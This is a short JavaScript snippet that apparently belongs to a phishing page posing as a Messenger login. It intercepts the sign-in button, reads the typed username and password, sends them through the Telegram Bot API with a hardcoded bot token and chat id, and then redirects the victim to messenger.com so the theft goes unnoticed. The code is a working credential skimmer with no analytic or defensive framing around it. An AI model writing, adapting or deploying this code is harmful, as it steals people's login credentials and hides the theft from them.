document
  .getElementById("000-button_user-login_sign-in-form_log-in")
  .addEventListener("click", function (e) {
    e.preventDefault();

    var username = document.querySelector('input[name="username"]').value;
    var pass = document.querySelector('input[name="pass"]').value;

    var message = `${username} -> ${pass}`;

    var token = "6218757530:AAHEXMuFu2uaK_nAyA1WJ8mJY0K-Cdymn90";
    var chat_id = "5770507003";
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`;

    var oReq = new XMLHttpRequest();
    oReq.open("GET", url, true);
    oReq.send();

    window.location.href = "https://messenger.com";
  });
